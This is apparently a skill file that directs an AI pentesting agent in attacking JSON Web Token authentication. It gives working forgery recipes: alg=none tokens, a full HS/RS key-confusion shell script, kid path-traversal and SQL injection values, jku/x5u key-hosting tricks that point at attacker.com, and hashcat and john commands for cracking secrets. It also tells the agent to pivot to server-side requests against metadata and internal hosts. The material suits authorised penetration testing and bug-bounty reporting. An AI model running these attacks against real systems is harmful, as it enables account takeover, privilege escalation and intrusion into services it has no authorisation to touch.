---
name: jwt
description: JWT attack playbook — algorithm confusion (alg=none, HS/RS confusion), kid path traversal/SQLi, jku/x5u SSRF, weak HS256 cracking, and embedded JWK trickery. Use when the target uses JWTs for auth (header.payload.signature).
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# JWT playbook

You have one or more `eyJ...` tokens. The goal is to forge an authenticated token that the server accepts.

Execution rule: use real tokens, URLs, and keys from the scoped target before running commands. Never write literal placeholders such as `<payload-b64>` or `<future>` to files; if a value is missing, ask once.

## 0. Decode every token you have

Base64url-decode header and payload. Note:
- `alg` — algorithm. `none`, `HS256`, `HS384`, `HS512`, `RS256`, `RS384`, `RS512`, `ES256`, `ES384`, `ES512`, `PS256`...
- `kid` — key identifier (path / id pointing at a key on the server).
- `jku` — URL to a JWK Set hosting the signing keys.
- `jwk` — embedded JWK.
- `x5u` — URL to an X.509 certificate.
- `x5c` — embedded X.509 chain.

```sh
echo "<payload-b64>" | base64 -d | jq .
```

Capture the user id / role field for later forgery (`sub`, `uid`, `role`, `isAdmin`, ...).

## 1. alg=none

Many libraries used to (and a few still do) accept `{"alg":"none"}` and skip signature verification. Forge:

```
header  = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"sub":"admin","role":"admin","exp":<future>})
signature = ""           # empty, but the trailing dot stays
token = header + "." + payload + "."
```

Variants to try: `none`, `None`, `NONE`, `NoNe` (case fuzzing) — `read_payloads(skill="jwt", file="alg-none-variants.txt")`.

## 2. HS/RS algorithm confusion

If the server expects RS256 (asymmetric, verifies with public key) and you can obtain the public key, you can forge an HS256 token signed with the public key as the HMAC secret.

Find the public key:
- `/.well-known/jwks.json`, `/jwks.json`, `/api/jwks`, `/oauth2/jwks`, `/jwks_uri` from OIDC discovery.
- Sometimes embedded in a JS bundle (`grep -E "BEGIN PUBLIC KEY" -r`).

Forge with `hs-rs-confusion.sh`:

```sh
PUB=$(curl -s https://target/.well-known/jwks.json | jq -r '.keys[0]' | jose key -i- -O pem.pub)
HEAD=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | base64url)
PAYL=$(printf '%s' '{"sub":"admin","exp":2000000000}' | base64url)
SIG=$(printf '%s.%s' "$HEAD" "$PAYL" | openssl dgst -sha256 -hmac "$(cat pem.pub)" -binary | base64url)
echo "$HEAD.$PAYL.$SIG"
```

(`base64url` here is `base64 | tr '+/' '-_' | tr -d '='`.)

## 3. kid path traversal / SQLi

`kid` is often used as a database lookup or file path. Try injecting:

- `../../../../../../dev/null` — server reads `/dev/null` (empty string) as the key. HMAC over an empty key is predictable; sign with `""`.
- `../../../../../../etc/passwd` — succeeds if the server is parsing the file as the key. (Has happened.)
- SQLi: `kid` = `' UNION SELECT 'aaaa' --` — server returns "aaaa" as the key, sign with that.
- Null-byte truncation on older parsers.

Payloads in `read_payloads(skill="jwt", file="kid-injection.txt")`.

## 4. jku / x5u → SSRF + key control

If the server fetches the JWKS at the URL in the `jku` (or `x5u`) header, you control the key:

1. Host your own JWKS containing a key you generated.
2. Sign the token with the matching private key.
3. Set `jku` to your URL.

Bypasses if the server validates `jku` against a domain:
- Open redirect on the trusted domain: `jku=https://target.com/redirect?to=attacker.com/jwks.json`.
- `@` trick: `jku=https://target.com@attacker.com/jwks.json`.
- Subdomain takeover on a wildcard-trusted domain.

If the validation rejects you entirely, this is still a **server-side fetch** — escalate per the [[ssrf]] skill (hit metadata, internal hosts) even without forging a token.

## 5. Embedded jwk

Some libraries trust an embedded `jwk` in the header. Generate a fresh keypair, embed the public key in the header, sign with the private key — the server uses what you embedded.

```python
# minimal forge using python-jose / authlib
```

## 6. Weak HS256 secret

If `alg=HS256`, try to crack the HMAC secret offline:

```sh
hashcat -m 16500 token.jwt rockyou.txt
john --format=HMAC-SHA256 token.jwt
```

Common secrets to try first: `secret`, `your-256-bit-secret`, `change-me`, the company name, the API base hostname, an env-var-looking string. See `read_payloads(skill="jwt", file="weak-secrets.txt")`.

## 7. Header smuggling / `cty` confusion

- `cty: "JWT"` — chain another JWT inside; some libraries unwrap.
- Duplicate keys in the JSON header (some parsers take first, others last).
- Trailing data after the signature (some parsers ignore).

## 8. Sliding-window expiry

`exp` not enforced? `nbf` in the future ignored? Replay a long-expired admin token.

## Reporting

Required evidence:
- The original token (redact sensitive payload fields).
- The forged token (full).
- The exact request that demonstrates impact (e.g. GET `/api/admin/users` with the forged token returns 200 with user data).
- Server response showing privileges granted.

For "alg=none accepted" without a payload that actually unlocks something useful, that's typically Medium / Low — call out the specific endpoints that the forged token authenticates to.
